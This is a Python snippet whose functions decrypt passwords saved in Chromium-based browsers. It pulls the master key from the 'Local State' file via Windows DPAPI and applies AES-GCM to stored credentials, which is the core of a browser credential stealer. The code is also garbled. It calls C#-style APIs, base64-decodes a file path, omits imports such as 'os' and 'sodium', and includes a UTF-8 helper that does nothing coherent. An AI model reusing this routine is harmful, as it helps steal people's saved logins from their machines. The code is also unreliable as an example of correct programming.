import base64
import dpapi
# Decrypt value from Chrome > 80 version.
def decryptChrome(password, browser=None):
    # If Chromium version > 80
    if password.startswith('v10') or password.startswith('v11'):
        # Get masterkey location
        masterKeyPath = None
        for l_s in ['', '\\.\\', '\\..\\..']:
            masterKeyPath = Path.GetDirectoryName(browser) + l_s + '\\Local State'
            if os.path.exists(masterKeyPath):
                break
        # Get master key
        masterKey = dpapi.Decrypt(base64.b64decode(masterKeyPath).read().hex().decode(), None)
        masterKey = masterKey.hex().decode()
        # Decrypt password by master-key
        bytePassword = base64.b64decode(password.encode()).read().hex().decode()
        iv = bytePassword[:12]
        payload = bytePassword[12:]
        decryptedPassword = base64.b64decode(sodium.aead_aes_256gcm_decrypt(payload, iv, masterKey)).decode()
        return decryptedPassword
    else:
        try:
            return dpapi.Decrypt(base64.b64decode(password.encode()).read(), None).decode()
        except:
            return "failed (DPAPI)"
# Convert 1251 to UTF8
def toUTF8(text):
    win1251 = base64.b64decode(b''.join(chr(x) for x in text.encode('cp1251')))
    return text.encode('utf-8', 'ignore').decode('utf-8')
